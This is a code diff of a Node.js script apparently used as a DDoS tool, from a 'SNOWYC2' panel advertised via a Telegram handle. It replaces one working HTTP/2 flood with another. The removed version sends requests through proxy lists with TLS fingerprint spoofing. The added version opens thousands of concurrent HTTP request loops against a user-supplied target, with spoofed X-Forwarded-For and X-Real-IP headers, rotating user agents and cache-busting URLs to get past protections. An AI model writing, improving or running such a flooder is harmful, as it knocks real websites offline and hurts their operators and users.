@@ -1,184 +1,184 @@
-const { exec } = require('child_process');
-require('events').EventEmitter.defaultMaxListeners = 0;
-process.setMaxListeners(0);
-
+const axios = require('axios');
 const fs = require('fs');
-const url = require('url');
+const os = require('os');
 const http = require('http');
-const tls = require('tls');
-const crypto = require('crypto');
-const http2 = require('http2');
-const readline = require('readline');
-tls.DEFAULT_ECDH_CURVE;
+const https = require('https');
+const process = require('process');
 
-let payload = {};
-let h2Count = 0;
-let h1Count = 0;
-let totalCount = 0;
-let startTime = Date.now();
-let duration;
+const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 3940); // adjust if needed
+const REQUEST_TIMEOUT = 8000;
 
-console.clear();
-console.log("== HTTP/2 Attack Starting ==");
-
-try {
-    var proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
-} catch (error) {
-    console.log('Proxy file not found, "proxy.txt".');
-    process.exit();
-}
-
-try {
-    var objetive = process.argv[2];
-    duration = parseInt(process.argv[3]) * 1000;
-    var parsed = url.parse(objetive);
-} catch (error) {
-    console.log('Failed to load target data.');
-    process.exit();
-}
-
-const sigalgs = [
-    'ecdsa_secp256r1_sha256',
-    'ecdsa_secp384r1_sha384',
-    'ecdsa_secp521r1_sha512',
-    'rsa_pss_rsae_sha256',
-    'rsa_pss_rsae_sha384',
-    'rsa_pss_rsae_sha512',
-    'rsa_pkcs1_sha256',
-    'rsa_pkcs1_sha384',
-    'rsa_pkcs1_sha512',
-];
-
-let SignalsList = sigalgs.join(':');
-
-try {
-    var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
-} catch (error) {
-    console.log('Failed to load ua.txt');
-}
-
-class TlsBuilder {
-    constructor(socket) {
-        this.curve = "GREASE:X25519:x25519";
-        this.sigalgs = SignalsList;
-        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION |
-            crypto.constants.SSL_OP_NO_TICKET |
-            crypto.constants.SSL_OP_NO_SSLv2 |
-            crypto.constants.SSL_OP_NO_SSLv3 |
-            crypto.constants.SSL_OP_NO_COMPRESSION |
-            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
-            crypto.constants.SSL_OP_TLSEXT_PADDING |
-            crypto.constants.SSL_OP_ALL;
-    }
-
-    Alert() {
-        console.log('HTTP/2 Flood by @Icmpoff');
-    }
-
-    http2TUNNEL(socket) {
-        socket.setKeepAlive(true, 1000);
-        socket.setTimeout(10000);
-
-        payload[":method"] = "GET";
-        payload["Referer"] = objetive;
-        payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
-        payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-        payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-        payload['client-control'] = 'max-age=43200, s-max-age=43200';
-        payload['Upgrade-Insecure-Requests'] = 1;
-        payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
-        payload['Accept-Encoding'] = 'gzip, deflate, br';
-        payload['Accept-Language'] = 'utf-8, iso-8859-1;q=0.5, *;q=0.1';
-        payload[":path"] = parsed.path;
-
-        const tunnel = http2.connect(parsed.href, {
-            createConnection: () => tls.connect({
-                socket: socket,
-                ciphers: tls.getCiphers().join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256" + ":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:" + 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
-                host: parsed.host,
-                servername: parsed.host,
-                secure: true,
-                honorCipherOrder: true,
-                requestCert: true,
-                secureOptions: this.Opt,
-                sigalgs: this.sigalgs,
-                rejectUnauthorized: false,
-                ALPNProtocols: ['h2'],
-            }, () => {
-
-                for (let i = 0; i < 12; i++) {
-                    setInterval(() => {
-                        const req = tunnel.request(payload);
-                        req.on('response', () => {
-                            h2Count++;
-                            totalCount++;
-                        });
-                        req.on('error', () => {});
-                        req.end();
-                    }, 0);
-                }
-
-            })
-        });
+function loadLines(filename) {
+    try {
+        return fs.readFileSync(filename, 'utf8')
+            .split('\n')
+            .map(line => line.trim())
+            .filter(line => line.length > 0);
+    } catch {
+        return [];
     }
 }
 
-BuildTLS = new TlsBuilder();
-BuildTLS.Alert();
+const REFERERS = loadLines('refs.txt');
+const USER_AGENTS = loadLines('ua.txt');
 
-const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity });
+const UA_POOL = Array.from({ length: 10000 }, () =>
+    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
 
-function Runner() {
-    for (let i = 0; i < 120; i++) {
-        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        proxy = proxy.split(':');
+const keepAliveHttp = new http.Agent({ keepAlive: true });
+const keepAliveHttps = new https.Agent({ keepAlive: true });
 
-        var req = http.get({
-            host: proxy[0],
-            port: proxy[1],
-            timeout: 10000,
-            method: "CONNECT",
-            agent: keepAliveAgent,
-            path: parsed.host + ":443"
-        });
+class AttackEngine {
+    constructor(target, duration) {
+        this.target = target;
+        this.duration = duration * 1000;
+        this.startTime = Date.now();
+        this.stats = {
+            total: 0,
+            success: 0,
+            errors: 0,
+            peakRps: 0
+        };
+        this.uaIndex = 0;
+        this.running = true;
+    }
 
-        req.end();
+    getRandomUA() {
+        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
+        return UA_POOL[this.uaIndex];
+    }
 
-        req.on('connect', (_, socket) => {
-            BuildTLS.http2TUNNEL(socket);
-        });
+    getRandomReferer() {
+        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
+    }
 
-        req.on('end', () => {
-            req.resume();
-            req.close();
-        });
+    async makeRequest() {
+        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
+        const headers = {
+            'User-Agent': this.getRandomUA(),
+            'Referer': this.getRandomReferer(),
+            'X-Forwarded-For': randomIP,
+            'X-Real-IP': randomIP,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        };
+
+        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
+
+        try {
+            const isHttps = this.target.startsWith('https');
+            const response = await axios.get(urlWithNoise, {
+                headers,
+                timeout: REQUEST_TIMEOUT,
+                httpAgent: keepAliveHttp,
+                httpsAgent: keepAliveHttps,
+                validateStatus: null
+            });
+            if (response.status === 200) {
+                this.stats.success++;
+                return;
+            }
+        } catch {
+            // ignored
+        }
+
+        this.stats.errors++;
+    }
+
+    async startWorkers() {
+        const workers = [];
+        for (let i = 0; i < MAX_CONCURRENT; i++) {
+            workers.push(this.workerLoop());
+        }
+        await Promise.all(workers);
+    }
+
+    async workerLoop() {
+        while (this.running && Date.now() - this.startTime < this.duration) {
+            this.stats.total++;
+            await this.makeRequest();
+        }
+    }
+
+    async runAttack() {
+        const showIntro = () => {
+            console.clear();
+            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
+            console.log('  ============================================');
+            console.log(`  TARGET: ${this.target}`);
+            console.log(`  TIME:   ${this.duration / 1000}s`);
+            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
+            console.log('  ============================================\n');
+        };
+
+        showIntro();
+
+        let lastTotal = 0;
+        const printStats = setInterval(() => {
+            const elapsed = (Date.now() - this.startTime) / 1000;
+            const currentRps = (this.stats.total - lastTotal) / 0.2;
+            lastTotal = this.stats.total;
+            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
+
+            process.stdout.write(
+                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
+            );
+        }, 200);
+
+        await this.startWorkers();
+        this.running = false;
+        clearInterval(printStats);
+        this.printSummary();
+    }
+
+    printSummary() {
+        const elapsed = (Date.now() - this.startTime) / 1000;
+        const avgRps = this.stats.total / elapsed;
+        console.log('\n\n  ATTACK FINISHED');
+        console.log('  ============================================');
+        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
+        console.log(`  TOTAL:       ${this.stats.total}`);
+        console.log(`  SUCCESS:     ${this.stats.success}`);
+        console.log(`  ERRORS:      ${this.stats.errors}`);
+        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
+        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
+        console.log('  ============================================\n');
     }
 }
 
-setInterval(Runner);
+// Main
+(async () => {
+    const readline = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
 
-setInterval(() => {
-    const now = Date.now();
-    const elapsed = now - startTime;
-    const remaining = Math.max(0, (duration - elapsed) / 1000).toFixed(1);
-    const rps = (totalCount / (elapsed / 1000)).toFixed(1);
+    const ask = (q) => new Promise(resolve => readline.question(q, resolve));
 
-    readline.cursorTo(process.stdout, 0, 0);
-    readline.clearScreenDown(process.stdout);
+    const targetInput = await ask("TARGET: ");
+    let target = targetInput.trim();
+    if (!target.startsWith("http")) {
+        target = "http://" + target;
+    }
 
-    console.log("HTTP/2 FLOOD - Metrics");
-    console.log("======================");
-    console.log(`H2 REQUESTS:          ${h2Count}`);
-    console.log(`H1 REQUESTS:          ${h1Count}`);
-    console.log(`REQUESTS PER SECOND:  ${rps}`);
-    console.log(`TOTAL:                ${totalCount}`);
-    console.log(`TIME REMAINING:       ${remaining}s`);
-}, 300);
+    const durationInput = await ask("TIME: ");
+    readline.close();
 
-setTimeout(function () {
-    console.log('This attack has ended');
-    process.exit();
-}, duration);
+    const duration = parseInt(durationInput);
+    if (isNaN(duration)) {
+        console.log("Invalid time input.");
+        return;
+    }
 
-process.on('uncaughtException', function (er) {});
-process.on('unhandledRejection', function (er) {});
+    const engine = new AttackEngine(target, duration);
+    try {
+        await engine.runAttack();
+    } catch (err) {
+        console.error("Attack failed:", err.message);
+    }
+})();
